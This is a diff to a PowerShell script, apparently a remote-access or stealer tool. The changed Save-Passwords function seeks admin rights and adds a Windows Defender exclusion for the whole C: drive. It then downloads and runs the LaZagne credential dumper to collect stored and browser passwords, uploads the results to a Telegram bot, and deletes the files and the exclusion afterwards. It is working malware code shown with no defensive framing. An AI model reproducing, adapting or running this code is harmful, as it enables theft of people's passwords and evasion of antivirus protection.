@@ -342,13 +342,20 @@ Post-Message | Out-Null
 }
 
 Function Save-Passwords{
-$Output = "C:\temp"
+If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
+Write-output "You can close this session if a new session is waiting.."
+Attempt-Elevate
+break
+}
+else{
+Add-MpPreference -ExclusionPath C:\
+}
+$Output = "$env:temp"
 $ResultFile = "$Output\$env:computername.txt"
 Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$Output/l.exe"
 Set-Location $Output
 Start-Sleep -Milliseconds 15000
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
-
 try {
     # Create a byte array from the file
     $FileStream = [System.IO.File]::OpenRead($ResultFile)
@@ -374,19 +381,16 @@ try {
         "--$boundary--",
         ""
     ) -join $LF
-
     # Convert the body to a byte array
     $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)
-
     # Send the request to the Telegram API
     $TelegramAPI = "https://api.telegram.org/bot$Token/sendDocument"
     $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes
-
 # Send the result file
 Send-TelegramFile -Token $Token -chatID $chatID -FilePath $ResultFile
-
 # Cleanup
 Remove-Item $ResultFile, "$Output/l.exe" -Force -ErrorAction SilentlyContinue
+Remove-MpPreference -ExclusionPath C:\
 }
     catch [System.Exception]
     {
